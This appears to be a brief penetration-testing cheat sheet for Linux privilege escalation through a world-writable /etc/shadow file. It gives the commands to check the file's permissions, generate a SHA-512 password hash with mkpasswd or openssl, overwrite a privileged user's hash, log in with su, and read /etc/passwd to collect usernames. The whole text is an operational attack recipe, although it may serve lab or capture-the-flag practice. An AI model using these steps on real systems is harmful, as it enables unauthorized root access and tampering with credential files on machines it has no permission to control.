- Identify if shadow file is globally writeable:
    ls -l /etc/shadow
    -rw-r--rw- 1 root shadow 837 Apr 12 01:32 /etc/shadow

If they are you can try replacing their hashes with a password hash of your choice

- Replace user hash in /etc/shadow
    mkpasswd -m sha-512 <new password> will create a new hash

    if `mkpasswd` is unavailable, try:
    openssl passwd -6 <new_password>

    Copy the entire hash and replace the hash of any privileged user in the shadow file

- use: `su <user>` and use new password to login

NOTE: if you can access the /etc/passwd file, it's possible to gather usernames for further investigation
